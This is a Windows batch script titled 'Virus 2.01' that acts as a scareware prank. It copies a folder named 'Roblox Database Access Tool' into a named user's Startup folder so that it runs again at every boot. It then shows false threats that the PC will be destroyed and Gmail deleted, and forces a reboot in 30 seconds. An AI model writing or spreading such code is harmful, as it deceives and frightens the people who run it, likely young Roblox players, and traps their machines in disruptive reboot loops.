@echo off
color 0c
title Virus 2.01
prompt VIRUS://
mode 1000
xcopy /s /e "C:\Roblox Database Access Tool" "C:\Users\Pralea Matei\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y
cls
goto 1

:1
echo You are infected with a virus. Do not close the program, it will start again at boot up.
pause
cls
echo Do you want to continue ? Type Y or yes, or N for no. Typing N will destroy your PC and will delete your Gmail.
pause
cls
set input =
set /p input=Please type Y or N to continue !
if %input%==Y goto A
if %input%==N goto B

:A 
echo Virus will reboot your PC to save the changes.
pause
cls
shutdown -r -t 30


:B
echo You want to see what will happen when you say N. You can see right now.
pause
cls
echo Press any key to continue malware ! ...
shutdown -r -t 30